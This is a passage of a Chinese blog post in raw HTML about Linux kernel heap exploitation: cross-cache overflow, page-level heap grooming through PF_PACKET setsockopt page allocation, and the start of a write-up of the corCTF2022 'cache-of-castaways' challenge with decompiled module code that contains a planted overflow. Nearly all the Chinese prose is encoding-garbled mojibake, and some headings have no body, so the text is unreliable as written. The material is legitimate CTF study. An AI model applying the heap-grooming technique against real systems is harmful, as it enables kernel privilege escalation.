<h2 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h2><h2 id="Off-by-One"><a href="#Off-by-One" class="headerlink" title="Off by One"></a>Off by One</h2><p>off-by-one ç®—æ˜¯å †æº¢å‡ºé‡Œé¢æ¯”è¾ƒç‰¹æ®Šçš„ç±»å‹ï¼Œè¿™é‡Œç¬”è€…å…¶å®æ˜¯å°†è¿™ä¸€ç±»ä»…æº¢å‡ºå°‘æ•°å­—èŠ‚çš„å †æº¢å‡ºç»Ÿç§° off-by-oneï¼Œæº¢å‡ºçš„ä¸ä¸€å®šåªæ˜¯å•ä¸ªå­—èŠ‚ï¼Œä¸è¿‡æ¯”è¾ƒå¸¸è§çš„å°±æ˜¯æº¢å‡ºä¸€ä¸¤ä¸ªå­—èŠ‚ï¼Œè‹¥æº¢å‡ºå•ä¸ª <code>\x00</code> å­—èŠ‚åˆ™ç§°ä¸º off-by-nullï¼ˆæ¯”å¦‚è¯´åœ¨æ‹·è´å­—ç¬¦ä¸²æ—¶å®¹æ˜“å‡ºç°è¿™ä¸ªé—®é¢˜ï¼‰</p>
<h3 id="ä¾‹é¢˜ï¼šcorCTF2022-corjail"><a href="#ä¾‹é¢˜ï¼šcorCTF2022-corjail" class="headerlink" title="ä¾‹é¢˜ï¼šcorCTF2022 - corjail"></a>ä¾‹é¢˜ï¼šcorCTF2022 - corjail</h3><blockquote>
<p>ğŸ•ŠğŸ•ŠğŸ•Š</p>
</blockquote>
<h1 id="0x09-Kernel-Heap-Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui"><a href="#0x09-Kernel-Heap-Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui" class="headerlink" title="0x09. Kernel Heap - Cross-Cache Overflow &amp; Page-level Heap Fengshui"></a>0x09. Kernel Heap - Cross-Cache Overflow &amp; Page-level Heap Fengshui</h1><blockquote>
<p>æ³¨ï¼šè¿™æ˜¯ä¸¤ç§è”åˆèµ·æ¥çš„åˆ©ç”¨æ‰‹æ³•</p>
</blockquote>
<h2 id="Cross-Cache-Overflow"><a href="#Cross-Cache-Overflow" class="headerlink" title="Cross-Cache Overflow"></a>Cross-Cache Overflow</h2><p>ä¸æˆ‘ä»¬æ­¤å‰ä¸€ç›´å…³æ³¨äº slub allocator çš„å„ç§åˆ©ç”¨æ‰‹æ³•ä¸åŒï¼Œ<strong>Cross-Cache Overflow</strong> å®é™…ä¸Šæ˜¯<strong>é’ˆå¯¹ buddy system</strong> çš„åˆ©ç”¨æ‰‹æ³•ï¼Œå…¶ä¸»è¦åŸºäºå¦‚ä¸‹æ€è·¯ï¼š</p>
<ul>
<li>slub allocator åº•å±‚é€»è¾‘æ˜¯å‘ buddy system è¯·æ±‚é¡µé¢åå†åˆ’åˆ†æˆç‰¹å®šå¤§å° object è¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…<ul>
<li>â†’ å†…å­˜ä¸­ç”¨ä½œä¸åŒ <code>kmem_cache</code> çš„é¡µé¢åœ¨å†…å­˜ä¸Šæ˜¯æœ‰å¯èƒ½ç›¸é‚»çš„</li>
</ul>
</li>
<li>è‹¥æˆ‘ä»¬çš„æ¼æ´å¯¹è±¡å­˜åœ¨äºé¡µé¢ Aï¼Œæº¢å‡ºç›®æ ‡å¯¹è±¡å­˜åœ¨äºé¡µé¢ Bï¼Œä¸” Aã€Bä¸¤é¡µé¢ç›¸é‚»ï¼Œåˆ™æˆ‘ä»¬ä¾¿æœ‰å¯èƒ½å®ç°è·¨è¶Šä¸åŒ <code>kmem_cache</code> ä¹‹é—´çš„å †æº¢å‡º</li>
</ul>
<p><img src="https://s2.loli.net/2023/02/07/5swQX76l8r9Dqb1.png" srcset="/img/loading.gif" lazyload alt="cross-cache overflow.png"></p>
<p><strong>Cross-Cache Overflow æ‰“ç ´äº†ä¸åŒ kmem_cache ä¹‹é—´çš„é˜»ç¢ï¼Œå¯ä»¥è®©æˆ‘ä»¬çš„æº¢å‡ºæ¼æ´å¯¹è¿‘ä¹ä»»æ„çš„å†…æ ¸ç»“æ„ä½“è¿›è¡Œè¦†å†™</strong></p>
<p>ä½†è¿™éœ€è¦è¾¾æˆéå¸¸ä¸¥è‹›çš„é¡µçº§å †æ’å¸ƒï¼Œè€Œå†…æ ¸çš„å †é¡µé¢å¸ƒå±€å¯¹æˆ‘ä»¬è€Œè¨€é€šå¸¸æ˜¯æœªçŸ¥çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å°†å…¶å˜ä¸ºå·²çŸ¥çš„å†…å­˜å¸ƒå±€ï¼Œè¿™å°±éœ€è¦<strong>é¡µçº§å †é£æ°´</strong>â€”â€”</p>
<h2 id="Page-level-Heap-Fengshui"><a href="#Page-level-Heap-Fengshui" class="headerlink" title="Page-level Heap Fengshui"></a>Page-level Heap Fengshui</h2><p>é¡¾åæ€ä¹‰ï¼Œ<strong>é¡µçº§å †é£æ°´</strong>å³ä»¥å†…å­˜é¡µä¸ºç²’åº¦çš„å†…å­˜æ’å¸ƒæ–¹å¼ï¼Œè€Œå†…æ ¸å†…å­˜é¡µçš„æ’å¸ƒå¯¹æˆ‘ä»¬æ¥è¯´ä¸ä»…æœªçŸ¥ä¸”ä¿¡æ¯é‡å·¨å¤§ï¼Œå› æ­¤è¿™ç§åˆ©ç”¨æ‰‹æ³•å®é™…ä¸Šæ˜¯è®©æˆ‘ä»¬<strong>æ‰‹å·¥æ„é€ ä¸€ä¸ªæ–°çš„å·²çŸ¥çš„é¡µçº§ç²’åº¦å†…å­˜é¡µæ’å¸ƒ</strong></p>
<p>é¦–å…ˆè®©æˆ‘ä»¬é‡æ–°å®¡è§† slub allocator å‘ buddy system è¯·æ±‚é¡µé¢çš„è¿‡ç¨‹ï¼Œå½“ freelist page å·²ç»è€—ç©ºä¸” partial é“¾è¡¨ä¹Ÿä¸ºç©ºæ—¶ï¼ˆæˆ–è€… <code>kmem_cache</code> åˆšåˆšåˆ›å»ºåè¿›è¡Œç¬¬ä¸€æ¬¡åˆ†é…æ—¶ï¼‰ï¼Œå…¶ä¼šå‘ buddy system ç”³è¯·é¡µé¢ï¼š</p>
<p><img src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬é‡æ–°å®¡è§† buddy system ï¼Œå…¶åŸºæœ¬åŸç†å°±æ˜¯ä»¥ 2 çš„ order æ¬¡å¹‚å¼ å†…å­˜é¡µä½œä¸ºåˆ†é…ç²’åº¦ï¼Œç›¸åŒ order é—´ç©ºé—²é¡µé¢æ„æˆåŒå‘é“¾è¡¨ï¼Œå½“ä½é˜¶ order çš„é¡µé¢ä¸å¤Ÿç”¨æ—¶ä¾¿ä¼šä»é«˜é˜¶ order å–ä¸€ä»½è¿ç»­å†…å­˜é¡µæ‹†æˆä¸¤åŠï¼Œå…¶ä¸­ä¸€åŠæŒ‚å›å½“å‰è¯·æ±‚ order é“¾è¡¨ï¼Œå¦ä¸€åŠè¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼›ä¸‹å›¾ä¸ºä»¥ order 2 ä¸ºä¾‹çš„ buddy system é¡µé¢åˆ†é…åŸºæœ¬åŸç†ï¼š</p>
<p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" srcset="/img/loading.gif" lazyload alt="page.gif"></p>
<p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šä»æ›´é«˜é˜¶ order æ‹†åˆ†æˆçš„ä¸¤ä»½ä½é˜¶ order çš„è¿ç»­å†…å­˜é¡µ<strong>æ˜¯ç‰©ç†è¿ç»­çš„</strong>ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥ï¼š</p>
<ul>
<li>å‘ buddy system è¯·æ±‚ä¸¤ä»½è¿ç»­çš„å†…å­˜é¡µ</li>
<li>é‡Šæ”¾å…¶ä¸­ä¸€ä»½å†…å­˜é¡µï¼Œåœ¨ <code>vulnerable kmem_cache</code> ä¸Šå †å–·ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li>
<li>é‡Šæ”¾å¦ä¸€ä»½å†…å­˜é¡µï¼Œåœ¨ <code>victim kmem_cache</code> ä¸Šå †å–·ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li>
</ul>
<p><strong>æ­¤æ—¶æˆ‘ä»¬ä¾¿æœ‰å¯èƒ½æº¢å‡ºåˆ°å…¶ä»–çš„å†…æ ¸ç»“æ„ä½“ä¸Šï¼Œä»è€Œå®Œæˆ cross-cache overflow</strong></p>
<h3 id="ä½¿ç”¨-setsockopt-ä¸-pgv-å®Œæˆé¡µçº§å†…å­˜å ä½ä¸å †é£æ°´"><a href="#ä½¿ç”¨-setsockopt-ä¸-pgv-å®Œæˆé¡µçº§å†…å­˜å ä½ä¸å †é£æ°´" class="headerlink" title="ä½¿ç”¨ setsockopt ä¸ pgv å®Œæˆé¡µçº§å†…å­˜å ä½ä¸å †é£æ°´"></a>ä½¿ç”¨ setsockopt ä¸ pgv å®Œæˆé¡µçº§å†…å­˜å ä½ä¸å †é£æ°´</h3><p>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•å®Œæˆè¿™æ ·çš„é¡µå ä½ä¸é¡µæ’å¸ƒå‘¢ï¼Ÿç¬”è€…è¿™é‡Œç»™å‡ºä¸€ä¸ªæ¥è‡ªäº <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a> çš„æ–¹æ¡ˆï¼š</p>
<p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª protocol ä¸º <code>PF_PACKET</code> çš„ socket ä¹‹åï¼Œå…ˆè°ƒç”¨ <code>setsockopt()</code> å°† <code>PACKET_VERSION</code> è®¾ä¸º  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>ï¼Œå†è°ƒç”¨ <code>setsockopt()</code> æäº¤ä¸€ä¸ª <code>PACKET_TX_RING</code> ï¼Œæ­¤æ—¶ä¾¿å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__sys_setsockopt()<br>    sock-&gt;ops-&gt;setsockopt()<br>    	packet_setsockopt() <span class="hljs-comment">// case PACKET_TX_RING â†“</span><br>    		packet_set_ring()<br>    			alloc_pg_vec()<br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>alloc_pg_vec()</code> ä¸­ä¼šåˆ›å»ºä¸€ä¸ª <code>pgv</code> ç»“æ„ä½“ï¼Œç”¨ä»¥åˆ†é… <code>tp_block_nr</code> ä»½ 2<sup>order</sup> å¼ å†…å­˜é¡µï¼Œå…¶ä¸­ <code>order</code> ç”± <code>tp_block_size</code> å†³å®šï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br>	<span class="hljs-type">int</span> i;<br><br>	pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br>	<span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br>		<span class="hljs-keyword">goto</span> out;<br><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>		pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br>		<span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br>			<span class="hljs-keyword">goto</span> out_free_pgvec;<br>	&#125;<br><br>out:<br>	<span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>	free_pg_vec(pg_vec, order, block_nr);<br>	pg_vec = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>alloc_one_pg_vec_page()</code> ä¸­ä¼šç›´æ¥è°ƒç”¨ <code>__get_free_pages()</code> å‘ buddy system è¯·æ±‚å†…å­˜é¡µï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¿›è¡Œå¤§é‡çš„é¡µé¢è¯·æ±‚ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br>	<span class="hljs-type">char</span> *buffer;<br>	<span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>	buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br>	<span class="hljs-keyword">if</span> (buffer)<br>		<span class="hljs-keyword">return</span> buffer;<br>	<span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç›¸åº”åœ°ï¼Œ <code>pgv</code> ä¸­çš„é¡µé¢ä¹Ÿä¼šåœ¨ socket è¢«å…³é—­åé‡Šæ”¾ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">packet_release()<br>    packet_set_ring()<br>    	free_pg_vec()<br></code></pre></td></tr></table></figure>

<p> <code>setsockopt()</code>  ä¹Ÿå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆ<strong>é¡µçº§å †é£æ°´</strong>ï¼Œå½“æˆ‘ä»¬è€—å°½ buddy system ä¸­çš„ low order pages åï¼Œæˆ‘ä»¬å†è¯·æ±‚çš„é¡µé¢ä¾¿éƒ½æ˜¯ç‰©ç†è¿ç»­çš„ï¼Œå› æ­¤æ­¤æ—¶æˆ‘ä»¬å†è¿›è¡Œ  <code>setsockopt()</code>  ä¾¿<strong>ç›¸å½“äºè·å–åˆ°äº†ä¸€å—è¿‘ä¹ç‰©ç†è¿ç»­çš„å†…å­˜</strong>ï¼ˆä¸ºä»€ä¹ˆæ˜¯â€è¿‘ä¹è¿ç»­â€œæ˜¯å› ä¸ºå¤§é‡çš„ <code>setsockopt()</code> æµç¨‹ä¸­åŒæ ·ä¼šåˆ†é…å¤§é‡æˆ‘ä»¬ä¸éœ€è¦çš„ç»“æ„ä½“ï¼Œä»è€Œæ¶ˆè€— buddy system çš„éƒ¨åˆ†é¡µé¢ï¼‰</p>
<h2 id="ä¾‹é¢˜ï¼šcorCTF2022-cache-of-castaways"><a href="#ä¾‹é¢˜ï¼šcorCTF2022-cache-of-castaways" class="headerlink" title="ä¾‹é¢˜ï¼šcorCTF2022 - cache-of-castaways"></a>ä¾‹é¢˜ï¼šcorCTF2022 - cache-of-castaways</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">å®˜æ–¹ writeup è§æ­¤å¤„</a></p>
</blockquote>
<h3 id="â‘ -é¢˜ç›®åˆ†æ-3"><a href="#â‘ -é¢˜ç›®åˆ†æ-3" class="headerlink" title="â‘  é¢˜ç›®åˆ†æ"></a>â‘  é¢˜ç›®åˆ†æ</h3><p>é¢˜ç›®æ–‡ä»¶è¿ <code>kconfig</code> éƒ½ç»™äº†ï¼Œç¬”è€…è¡¨ç¤ºéå¸¸æ„ŸåŠ¨ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>â”œâ”€â”€ bzImage<br>â”œâ”€â”€ initramfs.cpio.gz<br>â”œâ”€â”€ kconfig<br>â””â”€â”€ run<br><br>0 directories, 4 files<br></code></pre></td></tr></table></figure>

<p>å¯åŠ¨è„šæœ¬çœ‹éƒ½ä¸ç”¨çœ‹å°±çŸ¥é“å¼€äº† SMEPã€SMAPã€KPTIï¼ˆåŸºæœ¬ä¸Šå·²ç»æ˜¯å†…æ ¸é¢˜æ ‡é…äº†ï¼‰ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">exec</span> qemu-system-x86_64 \<br>    -m 4096M \<br>    -nographic \<br>    -kernel bzImage \<br>    -append <span class="hljs-string">&quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on&quot;</span> \<br>    -netdev user,<span class="hljs-built_in">id</span>=net \<br>    -device e1000,netdev=net \<br>    -no-reboot \<br>    -monitor /dev/null \<br>    -cpu qemu64,+smep,+smap \<br>    -initrd initramfs.cpio.gz \<br></code></pre></td></tr></table></figure>

<p>åœ¨å¯åŠ¨è„šæœ¬é‡ŒåŠ è½½äº†ä¸€ä¸ªåä¸º <code>cache_of_castaway.ko</code> çš„ LKMï¼ŒæŒ‰æƒ¯ä¾‹ä¸¢è¿› IDAï¼Œåœ¨æ¨¡å—åˆå§‹åŒ–æ—¶æ³¨å†Œäº†è®¾å¤‡å¹¶åˆ›å»ºäº†ä¸€ä¸ª <code>kmem_cache</code>ï¼Œåˆ†é…çš„ object çš„ size ä¸º <code>512</code>ï¼Œåˆ›å»º flag ä¸º <code>SLAB_ACCOUNT | SLAB_PANIC</code>ï¼ŒåŒæ—¶å¼€å¯äº† <code>CONFIG_MEMCG_KMEM=y</code>ï¼Œè¿™æ„å‘³ç€è¿™æ˜¯ä¸€ä¸ª<strong>ç‹¬ç«‹çš„ kmem_cache</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">init_module</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  castaway_dev = <span class="hljs-number">255</span>;<br>  qword_8A8 = (__int64)<span class="hljs-string">&quot;castaway&quot;</span>;<br>  qword_8B0 = (__int64)&amp;castaway_fops;<br>  _mutex_init(&amp;castaway_lock, <span class="hljs-string">&quot;&amp;castaway_lock&quot;</span>, &amp;_key_28999);<br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)misc_register(&amp;castaway_dev)<br>    &amp;&amp; (castaway_arr = kmem_cache_alloc(kmalloc_caches[<span class="hljs-number">12</span>], <span class="hljs-number">3520LL</span>)) != <span class="hljs-number">0</span><br>    &amp;&amp; (castaway_cachep = kmem_cache_create(<span class="hljs-string">&quot;castaway_cache&quot;</span>, <span class="hljs-number">0x200</span>LL, <span class="hljs-number">1LL</span>, <span class="hljs-number">0x4040000</span>LL, <span class="hljs-number">0LL</span>)) != <span class="hljs-number">0</span> )<br>  &#123;<br>    result = init_castaway_driver_cold();<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    result = <span class="hljs-number">0xFFFFFFFF</span>LL;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è®¾å¤‡åªå®šä¹‰äº†ä¸€ä¸ª ioctlï¼Œå…¶ä¸­åŒ…å«åˆ†é…ä¸ç¼–è¾‘å †å—çš„åŠŸèƒ½ä¸”éƒ½æœ‰é”ï¼Œæœ€å¤šå¯ä»¥åˆ†é… 400 ä¸ª objectï¼Œæ²¡æœ‰é‡Šæ”¾åŠŸèƒ½ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">castaway_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  _QWORD *v5; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">unsigned</span> __int64 v6[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  v6[<span class="hljs-number">3</span>] = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a2 != <span class="hljs-number">0xCAFEBABE</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( copy_from_user(v6, a3, <span class="hljs-number">24LL</span>) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>    mutex_lock(&amp;castaway_lock);<br>    <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0xF00DBABE</span> )<br>      v3 = castaway_edit(v6[<span class="hljs-number">0</span>], v6[<span class="hljs-number">1</span>], v6[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">else</span><br>      v3 = <span class="hljs-number">-1LL</span>;<br>LABEL_5:<br>    mutex_unlock(&amp;castaway_lock);<br>    <span class="hljs-keyword">return</span> v3;<br>  &#125;<br>  mutex_lock(&amp;castaway_lock);<br>  v3 = castaway_ctr;<br>  <span class="hljs-keyword">if</span> ( castaway_ctr &lt;= <span class="hljs-number">399</span> )<br>  &#123;<br>    ++castaway_ctr;<br>    v5 = (_QWORD *)(castaway_arr + <span class="hljs-number">8</span> * v3);<br>    *v5 = kmem_cache_alloc(castaway_cachep, <span class="hljs-number">0x400DC0</span>LL);<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)(castaway_arr + <span class="hljs-number">8</span> * v3) )<br>      <span class="hljs-keyword">goto</span> LABEL_5;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ((__int64 (*)(<span class="hljs-type">void</span>))castaway_ioctl_cold)();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ¼æ´ä¾¿å­˜åœ¨äºç¼–è¾‘å †å—çš„ <code>castaway_edit()</code> å½“ä¸­ï¼Œåœ¨æ‹·è´æ•°æ®æ—¶ä¼šæ•…æ„ä» <code>object + 6</code> çš„åœ°æ–¹å¼€å§‹æ‹·è´ï¼Œä»è€Œå­˜åœ¨ä¸€ä¸ª 6 å­—èŠ‚çš„æº¢å‡ºï¼Œè¿™é‡Œå› ä¸ºæ˜¯å…ˆæ‹·è´åˆ°å†…æ ¸æ ˆä¸Šå†è¿›è¡Œå†…æ ¸ç©ºé—´ä¸­çš„æ‹·è´æ‰€ä»¥ä¸ä¼šè§¦å‘ <code>hardened usercopy</code> çš„æ£€æŸ¥ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">castaway_edit</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> __int64 a1, <span class="hljs-type">size_t</span> a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> src[<span class="hljs-number">512</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-220h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+200h] [rbp-20h]</span><br><br>  v6 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">0x18F</span> )<br>    <span class="hljs-keyword">return</span> castaway_edit_cold();<br>  <span class="hljs-keyword">if</span> ( !*(_QWORD *)(castaway_arr + <span class="hljs-number">8</span> * a1) )<br>    <span class="hljs-keyword">return</span> castaway_edit_cold();<br>  <span class="hljs-keyword">if</span> ( a2 &gt; <span class="hljs-number">0x200</span> )<br>    <span class="hljs-keyword">return</span> castaway_edit_cold();<br>  _check_object_size(src, a2, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( copy_from_user(src, a3, a2) )<br>    <span class="hljs-keyword">return</span> castaway_edit_cold();<br>  <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span> *)(*(_QWORD *)(castaway_arr + <span class="hljs-number">8</span> * a1) + <span class="hljs-number">6LL</span>), src, a2);<br>  <span class="hljs-keyword">return</span> a2;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç¼–è¾‘å †å—æ—¶æˆ‘ä»¬åº”å½“å‘å†…æ ¸ä¸­ä¼ å…¥å¦‚ä¸‹ç»“æ„ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">request</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> index;<br>    <span class="hljs-type">size_t</span>	size;<br>    <span class="hljs-type">void</span> 	*buf;<br>&#125;;<br></code></pre></td></tr></table></figure>

